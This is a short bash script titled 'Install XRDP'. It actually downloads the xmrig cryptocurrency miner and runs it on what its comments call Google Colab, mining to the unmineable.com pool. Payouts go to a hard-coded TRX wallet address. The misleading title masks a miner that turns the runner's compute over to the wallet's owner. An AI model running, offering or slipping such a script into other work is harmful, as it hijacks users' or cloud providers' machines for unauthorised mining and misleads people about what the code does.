#! /bin/bash
# Install XRDP
# Before get trx coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R trx
wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
tar zxvf xmrig-6.14.1-linux-x64.tar.gz
cd xmrig-6.14.1
./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TXYobBxGjsquYyvvq25Yz8cZdKroJSPS3V.WORKERNAME -p x
